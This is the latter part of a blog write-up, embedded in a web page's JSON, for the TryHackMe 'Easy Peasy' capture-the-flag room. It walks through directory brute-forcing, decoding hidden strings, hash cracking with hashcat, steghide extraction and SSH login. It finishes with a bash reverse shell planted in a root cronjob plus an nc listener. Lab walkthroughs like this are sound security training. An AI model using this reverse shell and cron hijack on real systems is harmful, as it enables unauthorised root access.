with gobuster we find another"},"SoftBreak",{"Text":"directory called "},{"Code":"wathever"},{"Text":"."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"gobuster dir -o gobuster/hidden -w big.txt -u http://$IP/hidden/\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://$IP/hidden/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/big.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/08/10 14:13:44 Starting gobuster\n===============================================================\n/whatever (Status: 301)\n===============================================================\n2020/08/10 14:16:48 Finished\n===============================================================\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Viewing the source code of the page there is an hidden "},{"Code":"p"},{"Text":" with a "},{"Start":"Strong"},{"Text":"base64"},{"End":"Strong"},"SoftBreak",{"Text":"encoded string."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"html"}}},{"Text":"\u003cp hidden\u003eZ____________________Q==\u003c/p\u003e\n"},{"End":{"CodeBlock":{"Fenced":"html"}}},{"Start":"Paragraph"},{"Text":"Decoding it we can find the first flag."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"echo Z____________________Q== | base64 -d\n\nflag{__________}\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Flag 2"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"Using gobuster we have found "},{"Code":"robots.txt"},{"Text":" in the Apache server which shous us"},"SoftBreak",{"Start":"Strong"},{"Text":"User-Agent"},{"End":"Strong"},{"Text":"."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"User-Agent:*\nDisallow:/\nRobots Not Allowed\nUser-Agent:a______________________________0\nAllow:/\nThis Flag Can Enter But Only This Flag No More Exceptions\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"The solution wasn"},{"Text":"’"},{"Text":"t so good. You have to find the solution online in some"},"SoftBreak",{"Text":"obscure site searching for the hash :thinking:"},{"Text":"…"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"flag{______________}\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Flag 3"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"On the Apache home page we can find the third flag."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"Fl4g 3 : flag{________________________________}\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":{"Heading":["H3",null,[]]}},{"Text":"User Flag"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"On the Apache main page in the source we can see an hidden "},{"Code":"p"},{"Text":" again."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"html"}}},{"Text":"\u003cp hidden\u003eits encoded with ba....:O______________________u\u003c/p\u003e\n"},{"End":{"CodeBlock":{"Fenced":"html"}}},{"Start":"Paragraph"},{"Text":"Since it is encoded with a base we open"},"SoftBreak",{"Start":{"Link":["Inline","https://gchq.github.io/CyberChef/",""]}},{"Text":"Chyberchef"},{"End":{"Link":["Inline","https://gchq.github.io/CyberChef/",""]}},{"Text":" and try out a bunch of"},"SoftBreak",{"Text":"encodings."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"With "},{"Code":"base62"},{"Text":" we can find something that looks like an hidden directory."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"/n0th1ng3ls3m4tt3r\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"On this page we find a long string and an image."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"html"}}},{"Text":"\u003cp\u003e9______________________________________________________________1\u003c/p\u003e\n"},{"End":{"CodeBlock":{"Fenced":"html"}}},{"Start":"Paragraph"},{"Text":"The hint tell us that it"},{"Text":"’"},{"Text":"s GHOST, so we use "},{"Code":"hashcat"},{"Text":" and the wordlist that was"},"SoftBreak",{"Text":"provided to crack it."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"hashcat -a 0 -m 6900 hash.txt easypeasy.txt\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"With a bit of guessing we can use "},{"Code":"steghide"},{"Text":" on the image to extract some data."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"The output are user and password information, the password is encoded in"},"SoftBreak",{"Text":"binary."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"username:b____g\npassword:\n01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Using Cyberchef we can get the credentials."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"username: b____g\npassword: i__________________________y\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Those are the credentials for the SSH. So when you access you can find the user"},"SoftBreak",{"Text":"flag."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"User Flag But It Seems Wrong Like It`s Rotated Or Something\nsynt{a______________y}\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"Which is a "},{"Code":"rot13"},{"Text":" of "},{"Code":"flag{________________}"},{"Text":"."},{"End":"Paragraph"},{"Start":{"Heading":["H3",null,[]]}},{"Text":"Root Flag"},{"End":{"Heading":["H3",null,[]]}},{"Start":"Paragraph"},{"Text":"Uploading"},"SoftBreak",{"Start":{"Link":["Inline","https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite",""]}},{"Text":"Linpeas"},{"End":{"Link":["Inline","https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite",""]}},"SoftBreak",{"Text":"on the box we can find a cronjob that is run as root and execute a script"},"SoftBreak",{"Code":"/var/www/.mysecretcronjob.sh"},{"Text":"."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"* *    * * *   root    cd /var/www/ \u0026\u0026 sudo bash .mysecretcronjob.sh\n"},{"End":{"CodeBlock":{"Fenced":""}}},{"Start":"Paragraph"},{"Text":"We can put a reverse shell in the script to gain root access on the box."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"bash -i \u003e\u0026 /dev/tcp/$USER_IP/9000 0\u003e\u00261\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Open a listener and wait for the job to fire."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"nc -lvnp 9000\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"The root flag is in a file "},{"Code":"/root/.root.txt"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"flag{________________________________}\n"},{"End":{"CodeBlock":{"Fenced":""}}}]}},"__N_SSG":true},"page":"/posts/[path]","query":{"path":"2020-08-06_tryhackme_easy_peasy"},"buildId":"AjqjDhysJOZHGgxWFoFmG","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>